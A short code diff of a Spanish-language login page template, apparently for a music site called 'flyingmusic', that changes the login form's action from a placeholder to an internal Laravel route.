@@ -18,7 +18,7 @@
                 <form action="https://www.facebook.com"><button class="btn facebook">Continuar con Facebook</button></form>
                 <form action="https://www.apple.com"><button class="btn apple">Continuar con Apple</button></form>
             </div>
-            <form action="#" method="POST">
+            <form action="{{ route('flyingmusic.log') }}" method="POST">
                 <div class="input-group">
                     <label for="username">Correo electrónico o nombre de usuario</label>
                     <input type="text" id="username" placeholder="Correo electrónico o nombre de usuario" required>
